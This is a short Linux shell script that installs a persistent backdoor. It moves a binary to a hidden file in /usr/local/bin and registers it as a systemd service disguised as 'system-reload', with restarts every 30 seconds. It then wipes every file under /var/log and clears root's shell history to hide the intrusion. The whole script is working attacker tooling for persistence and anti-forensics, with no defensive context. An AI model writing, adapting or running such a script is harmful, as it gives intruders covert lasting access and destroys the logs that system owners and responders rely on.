#!/bin/sh
SERVICE="system-reload"
PATH="/usr/local/bin"
FILE=".init"
BACKDOOR="$PATH/$FILE"

/usr/bin/mv run $BACKDOOR
/usr/bin/chmod 711 $BACKDOOR

/usr/bin/cat <<EOF > /lib/systemd/system/$SERVICE.service
[Unit]
Description=Reload Mode
Documentation=man:systemd.special(7)
After=network.target
[Service]
RestartSec=30s
Restart=always
TimeoutStartSec=5
ExecStart=$BACKDOOR
[Install]
WantedBy=multi-user.target
EOF

/usr/bin/systemctl daemon-reload && /usr/bin/systemctl enable $SERVICE && /usr/bin/systemctl start $SERVICE

for logs in `/usr/bin/find /var/log -type f`; do /usr/bin/cat /dev/null > $logs; done

/usr/bin/cat /dev/null > /root/.bash_history && history -c && history -w
